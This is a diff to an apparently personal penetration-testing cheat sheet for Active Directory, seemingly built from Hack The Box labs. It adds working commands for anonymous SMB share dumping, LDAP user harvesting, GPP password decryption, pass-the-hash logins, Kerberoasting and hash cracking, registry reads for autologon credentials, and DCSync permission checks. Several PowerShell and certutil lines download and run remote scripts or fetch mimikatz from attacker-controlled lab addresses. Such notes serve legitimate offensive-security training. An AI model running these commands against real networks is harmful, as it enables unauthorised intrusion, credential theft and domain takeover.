@@ -24,20 +24,24 @@ rpcclient -U "" -N "IP" 		(Null session)
 \
 > queryuser "RID"
 \
-> getdomainpwinfo
+> getdompwinfo
 \
 > getdomuserpwinfo "RID"
-
+\
+> querydominfo
+\
+> querydispinfo
+\
 >> Can also do password spraying through it
 
 ## dig:
 
+## ldapdomaindump:
 
 ## Zone Transfers:
-
-
-## Group Policy Decrypt (If we have SYSVOL):
-
+```bash
+dig axfr @"IP ADDRESS" "DOMAIN NAME"
+```
 
 ## nslookup (Can give DNS records):
 ```bash
@@ -45,6 +49,54 @@ nslookup
 > server "IP ADDRESS OF DNS SERVER"
 > 127.0.0.1 (Reverse Lookup)
 > "MACHINE IP ADDRESS" (Reverse Lookup of a Machine)
+```
+
+## DNSRECON:
+>> We can use `dnsrecon` to check for hostnames as well
+```bash
+dnsrecon -d "IP ADDRESS" -r "IP ADDRESS RANGE"
+```
+
+## IPC Share
+>> If we have IPC share with read only anonymosu access we can dump information
+```bash
+lookupsid.py anonymous@"IP ADDRESS"
+```
+ 
+## SMB Enumeration:
+>> Look for anonymous login using `smbclient`
+```bash
+smbclient -L \\"IP ADDRESS"
+```
+>> If we want to download everything using `smbclient`
+```bash
+smbclient //"IP ADDRESS"/"SHARE"
+recurse ON
+prompt OFF
+mget *
+```
+>> Look for access in shares using `smbmap`
+```bash
+smbmap -u "" -p "" -H "IP ADDRESS"
+
+smbmap -u anonymous -H "IP ADDRESS"
+```
+>> We can also list all files recursivly
+```bash
+smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS"
+```
+>> If we want to download a file
+```bash
+smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS" -A "FILE NAME" -q
+```
+>> We can then locate it
+\
+>> If found files through SMB or FTP download them and use `exiftool` to see if they leak a username
+
+## smbpasswd:
+>> If we get a `NT_STATUS_PASSWORD_MUST_CHANGE` error we can change the pass using `smbpasswd`
+```bash
+smbpasswd -r "IP ADDRESS" -U "USERNAME"
 ```
 
 ## ldapsearch (to query ldap server for domain names and other information):
@@ -68,8 +120,7 @@ ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")"
 \
 >> To search the output using ldapsearch we can use
 ```bash
-ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' # 
-This will give out the users list on the ldap server
+ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' # This will give out the users list on the ldap server
 ```
 >> To get usernames out of it we can do 
 ```bash
@@ -78,6 +129,10 @@ ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(ob
 >> To filter for usernames just use grep
 ```bash
 ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=User)' sAMAccountName | grep -i sAMAccountName | awk '{print $2}'
+```
+>> To search for a string in the output like default passwords
+```bash
+ldapsearch -h 192.168.80.7 -x -b "DC=pwn,DC=local" | grep -i "default"
 ```
 
 ## Generating password list from a list of common passwords:
@@ -112,6 +167,14 @@ hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r
 mv p > passlist.txt
 ```
 
+## Group Policy Decrypt (If we have SYSVOL):
+>> If we get access to SYSVOL share or we have any other way to retrieve Group Policies, we can extract the `Groups.xml` file containing username and cpassword
+\
+>> With that we can use `gpp-decrypt` to decrypt the cpassword
+```bash
+gpp-decrypt "CPASSWORD"
+```
+
 ## Crackmapexec:
 >> To check for password policy before doing a password spray to avoid account lockdown
 ```bash
@@ -141,7 +204,36 @@ crackmapexec smb "IP ADDRESS" -u "USERNAME" -H "HASH"
 ## psexec.py:
 >> We can use `psexec.py` to login using the hashes
 ```bash
-psexec.py --hashes "NT:LM" "USERNAME"@"IP ADDRESS"
+psexec.py -hashes "NT:LM" "USERNAME"@"IP ADDRESS"
+psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
+```
+
+## GetADUsers.py:
+>> If we have a username and password we can use `GetADUsers.py` to see users of AD
+```bash
+GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
+```
+
+## Kerberoasting Cheatsheet:
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+>> If we have a account username and password we can kerberoast using it
+```bash
+GetUserSPNs.py "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash
+```
+>> We can then crack it using hashcat
+```bash
+hashcat -m 13100 -a 0 hash ~/Desktop/rockyou.txt --force
+```
+>> If we get `CLOCK_SKET_TOO_GREAT` match the time with the DC time
+```bash
+# ON LINUX
+date
+
+# ON WINDOWS
+date
+
+# ON LINUX
+date -s "TIME OF DC"
 ```
 
 ## AS-REP Roasting:
@@ -169,6 +261,13 @@ evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
 >> Winpeas.exe (To find)
 \
 >> Unquoted Service Paths
+\
+>> DCSync (Exchange Windows Permissions)(Check for `Outbound Control Rights` from `BloodHound`)
+\
+>> WinLogon AutoCreds
+```bash
+reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" # ON WINDOWS
+```
 
 ## File Transfer Methods:
 >> SMB Server
@@ -187,7 +286,7 @@ certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
 ```
 >> Powershell
 ```powershell
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.14.12.230/CLSID.ps1'")
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.75/SharpHound.ps1')"
 
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
 
@@ -204,12 +303,28 @@ Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"
 locate neo4j | grep auth # Delete the auth file
 bloodhound --no-sandbox # Start bloodhound with the password you set earlier
 
-.\SharpHound.exe -c all # On Windows
+.\SharpHound.exe -c all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice # On Windows
+```
+>> If didnt work you can use `bloodhound-python` injestors instead
+```bash
+bloodhound-python -c all --domain htb.local -u svc-alfresco -p s3rvice -ns 10.129.149.232 -v
 ```
 >> You can change things in `SharpHound` to make more stealthy
 
 ## Rubeus:
 >> 
+
+## PowerSploit:
+>> Import `PowerView.ps1`
+>> To find users with DCSYnc perms
+```bash
+Get-ObjectACL "DC=pwn,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')}
+```
+>> Check the identity of user
+```bash
+Get-ADUser -Identity S-1-5-21-899434533-4132491356-2237190077-1657 
+```
+
 
 ## DACLs/ACLs:
 `acl-pwn`
